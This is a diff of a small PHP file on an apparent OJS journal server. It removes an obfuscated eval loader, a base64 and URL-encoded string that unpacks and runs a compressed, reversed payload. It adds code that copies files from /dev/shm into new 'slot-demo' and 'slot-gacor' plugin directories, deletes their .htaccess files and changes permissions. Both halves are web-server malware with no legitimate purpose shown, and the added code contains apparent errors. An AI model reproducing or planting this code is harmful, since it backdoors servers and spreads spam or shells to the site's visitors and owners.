@@ -1,6 +1,20 @@
 <?php
-$un = "ZXZhbCUyOCUyNnF1b3QlM0IlM0YlMjZndCUzQiUyNnF1b3QlM0IuZ3p1bmNvbXByZXNzJTI4Z3p1bmNvbXByZXNzJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4YmFzZTY0X2RlY29kZSUyOHN0cnJldiUyOCUyNHVrNDUlMjklMjklMjklMjklMjklMjklMjklMjklM0I=";
-$uk45 = "=QgZ3F7lVXnWPcUj+Y3bDHw1uuNL1V7D4vFm+w221S2i3Gm0Fl0if8ShboWZXJoVS7EW4Hl/NJv4OVZLlS5AE3BiDw8AGiksPr+epzl2FY4fK75YT5JUrlRI4r5wOFH+qKeK6d+xeNRm/VlcBeHlxx7PJFBFXjBHjdQSWbdZ9iwrBIVoloZoYwwrFQrWEsUN1BAprNw39ZQW/rdF937sVI0ZUpjEhFo2QkxkcQJUc9STe0zMZNcmef+eQSOu3UkGK41/DlOSQBLWoYh+4jF+cZXisy0YD5vJ3XEEgIsDLHZlci3/hAg3BwJe/bBApHw/RAg7B8PDAMfA";
-eval/******/(htmlspecialchars_decode(urldecode(base64_decode($un))));
-exit;
+$filea = '/dev/shm/var.log';
+$lpa = '/var/www/html/ojs-a/plugins/slot-demo/index.php';
+$fileb = '/dev/shm/readme.log';
+$lpb = '/var/www/html/ojs-a/plugins/slot-gacor/index.php';
+$dir = '/var/www/html/ojs-a/plugins/slot-demo/';
+$dira = '/var/www/html/ojs-a/plugins/slot-gacor/';
+$ht = '/var/www/html/ojs-a/plugins/slot-demo/.htaccess';
+$hta = '/var/www/html/ojs-a/plugins/slot-gacor/.htaccess';
+copy($filea, $lpa);
+copy($fileb, $lpb);
+mkdir("/var/www/html/ojs-a/plugins/slot-demo/");
+mkdir("/var/www/html/ojs-a/plugins/slot-gacor/");
+unlink($ht);
+unlink($hta);
+chmod($dir, 0755);
+chmod($$dira, 0755);
+chmod($lpa, 0644);
+chmod($lpb, 0644);
 ?>
